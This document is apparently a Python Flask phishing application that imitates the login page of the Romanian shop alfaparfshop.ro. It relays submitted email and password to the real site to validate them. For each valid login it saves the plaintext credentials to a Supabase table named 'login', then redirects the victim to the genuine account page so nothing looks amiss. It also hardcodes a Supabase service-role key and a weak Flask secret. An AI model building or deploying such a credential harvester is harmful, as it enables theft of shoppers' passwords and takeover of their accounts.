from flask import Flask, render_template, redirect, request, session as flask_session
from requests import Session, RequestException
import re
from supabase import create_client

login_url = 'https://www.alfaparfshop.ro/inregistrare?pcId=&preview=&a=&ret=&redirect='
desired_url_after_login = 'https://www.alfaparfshop.ro/contul-meu'
headers = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en-US,en;q=0.9,fr-FR;q=0.8,fr;q=0.7,ro-RO;q=0.6,ro;q=0.5",
    "Cache-Control": "max-age=0",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "https://www.alfaparfshop.ro",
    "Referer": "https://www.alfaparfshop.ro/inregistrare?pcId=&preview=&a=&ret=&redirect=",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
}
pattern = r'"name":"([0-9a-z]+)","value":"([0-9a-z]+)"'

app = Flask(__name__)
app.secret_key = 'supersecretkey' 

supabase_client = create_client(
    "https://ssadrzbwbfkhtyyhwhqe.supabase.co",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNzYWRyemJ3YmZraHR5eWh3aHFlIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTcyMDU1MDU4MCwiZXhwIjoyMDM2MTI2NTgwfQ.i9Fr3Gfvif06FSCDgvME8IX4gN55Sq-KdvM93dsnz6M"
)

@app.route('/')
def index():
    url = "https://www.alfaparfshop.ro/contul-meu"
    if 'cookies' in flask_session:
        cookies = flask_session['cookies']
        session = Session()
        session.cookies.update(cookies)
        try:
            response = session.get(url, allow_redirects=True, headers=headers)
            if response.url == url:
                return redirect(url)
        except RequestException as e:
            print(e)
    return redirect('/inregistrare')


@app.route("/inregistrare", methods=["POST", "GET"])
def inregistrare():
    errorMsg = False
    if request.method == "POST":
        email = request.form['email']
        password = request.form['password']
        session = Session()
        response = session.get(login_url, headers=headers)
        matches = re.findall(pattern, response.content.decode('utf-8'))
        if matches:
            hidden_input_name, hidden_input_value = matches[0]
            login_data = {
                "email": email,
                "password": password,
                hidden_input_name: hidden_input_value
            }
            response = session.post(login_url, data=login_data, headers=headers)
            if response.url == desired_url_after_login:
                flask_session['cookies'] = session.cookies.get_dict()
                supabase_client.table('login').insert({'email': email, 'password': password}).execute()
                return redirect(desired_url_after_login)
        errorMsg = True
    return render_template('inregistrare.html', errorMsg=errorMsg)
    